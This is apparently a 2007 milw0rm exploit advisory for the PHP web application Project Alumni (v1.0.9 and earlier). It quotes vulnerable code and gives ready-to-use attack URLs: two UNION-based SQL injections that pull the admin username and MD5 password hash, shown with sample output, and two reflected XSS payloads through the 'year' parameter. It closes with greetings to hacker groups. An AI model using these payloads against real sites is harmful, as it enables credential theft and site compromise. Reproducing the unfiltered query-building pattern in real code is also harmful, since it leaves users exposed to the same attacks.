@@ -1,0 +1,81 @@
+project-alumni sql injection & xss
+author : tomplixsee 
+tomplixsee@yahoo.co.id
+
+-------------------------------------------------------------------------------------------------------------
+affected software version	: project alumni v1.0.9, v1.0.8, or lower??
+download			: https://sourceforge.net/projects/project-alumni/
+
+
+vulnerability
+=============
+
+1.sql injection
+++++++++++++++++
+condition: magic_quotes_gpc = off
+
+vulnerable code on view.page.inc.php: 
+$result = dbQuery("SELECT * FROM `".getConfigVal("sqlTablePrefix",2)."_users` WHERE `alumniYear` = '".$_GET['year']."'"); 
+
+reason: bad filtering
+exploit:
+http://victim/path/index.php?act=view&year=2003' union select 1,1,1,alumniUserName,1,alumniPassword,1,1,1,1,1,1,1,1,1,1,1,1,1 from alumni_users where ID='1 
+
+result example:
++---------------------------------------------------------------------------------------------------+------------------------------------------+
+ |	Name   					 	|	Email		 |				 
++---------------------------------------------------------------------------------------------------+------------------------------------------+
+ |	tomplixsee (1) f25a2fc72690b780b2a14e140ef6a9e0	|	Not Available              |
++------------------------------------------------------------------------------------------------ --+------------------------------------------+
+tomplixsee is admin's username and f25a2fc72690b780b2a14e140ef6a9e0 is md5 encrypt from admin's password.
+
+
+vulnerable code on news.page.inc.php
+$result = dbQuery("SELECT * FROM `".getConfigVal("sqlTablePrefix",2)."_class_news` WHERE `year` = '".$_GET['year']."'");
+
+reason: bad filtering
+exploit:
+http://victim/path/index.php?act=news&year=2003' union select 1,2,3,4,5,6,alumniPassword,8,9 from alumni_users where ID='1
+
+2.xss
+++++++
+vulnerable code:
+
+________________________________________________________________________________
+#/xml/index.php									#
+#										#
+#	<?php 									#
+#	if(isset($_GET["year"])){						#
+#		$year = $_GET["year"];						#
+#	}									#
+#	if($year=='FRND')							#
+#		$yearText = "Friends of ".getConfigVal("schoolAbbr",2)." Alumni";		#
+#	else									#
+#		$yearText = "Class of $year";					#
+#	?>									#
+#	.....									#
+#	<?php echo"$yearText";?>						#
+#	.....									#
+#										#
+#exploit:									#
+#http://victim/path/xml/index.php?year=<xss>					#
+#_______________________________________________________________________________#
+# view.page.inc.php								#
+#										#
+#	<?php if(!$_GET['year']) { ?>						#
+#	....									#
+#	<?php } else if ($_GET['year'] < getConfigVal("alumniStartYear",2)) { ?>#
+#	....									#
+#	<?php } else { ?>							#
+#	<h2>Alumni for the Graduating Year of <?php echo $_GET['year'] ?></h2>	#
+#										#
+#exploit									#
+#http://victim/path/index.php?act=view&year=<xss>				#
+#_______________________________________________________________________________#
+
+
+salam untuk:
+anak-anak jaringan sukabirus, teman-teman di stt telkom, komunitas jasakom, 
+sibalbal, crutz_ao, bidulux, akillers 179...........
+
+# milw0rm.com [2007-11-24]
